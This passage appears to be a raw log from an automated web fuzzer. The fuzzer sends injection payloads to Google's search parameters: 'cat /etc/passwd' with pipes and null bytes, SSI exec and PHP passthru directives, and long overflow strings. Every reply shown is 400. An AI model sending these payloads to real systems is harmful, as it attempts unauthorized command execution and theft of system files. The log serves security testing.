[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=cat%20/etc/passwd&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=cat%20/etc/passwd&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=cat%20/etc/passwd&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=cat%20/etc/passwd&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=cat%20/etc/passwd&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=cat%20/etc/passwd HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=cat%20/etc/passwd%00&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=cat%20/etc/passwd%00&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=cat%20/etc/passwd%00&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=cat%20/etc/passwd%00&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=cat%20/etc/passwd%00&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=cat%20/etc/passwd%00&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=cat%20/etc/passwd%00 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=|cat%20/etc/passwd|&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=|cat%20/etc/passwd|&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=|cat%20/etc/passwd|&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=|cat%20/etc/passwd|&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=|cat%20/etc/passwd|&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=|cat%20/etc/passwd|&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=|cat%20/etc/passwd| HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=<!--#exec%20cmd="/bin/cat%20/etc/passwd"--> HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=<?passthru("cat%20/etc/passwd");?>&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=<?passthru("cat%20/etc/passwd");?>&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=<?passthru("cat%20/etc/passwd");?>&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=<?passthru("cat%20/etc/passwd");?>&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=<?passthru("cat%20/etc/passwd");?>&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=<?passthru("cat%20/etc/passwd");?>&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=<?passthru("cat%20/etc/passwd");?> HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA